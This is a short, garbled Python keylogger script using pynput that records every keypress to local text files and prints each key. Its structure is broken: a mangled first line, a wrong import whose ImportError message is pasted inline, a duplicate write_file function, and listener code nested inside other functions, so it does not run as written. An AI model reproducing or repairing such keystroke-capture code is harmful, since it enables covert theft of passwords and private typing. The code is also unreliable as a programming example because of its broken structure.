#key usinfrom pynput import keyboard
from pynput.keyboard import key , Listener

keys = []

def write_file(keys):
    with open("key_log.txt", "a") as file:
        for key in keys:
            file.write(str(key) + "\n")
    keys.clear()

def on_press(key):
    keys.append(key)
    write_file(keys)
    
    try:
        print('alphanumeric key{0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        
        
        def write_file(keys):
            with open('log.txt', 'w') as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    f.write(k)
                    
                    # every keystroke will be written to the file   
                    f.write('')
                    
                    def on_release(key):
                        print('{0} released'.format(key))
                        if key ==key.esc:
                            # stop listener
                            return False
                            
                            # Collect events until released                            ImportError: cannot import name 'key' from 'pynput.keyboard'
                            with Listener(on_press=on_press, 
                                          on_release=on_release) as listener:
                                listener.join()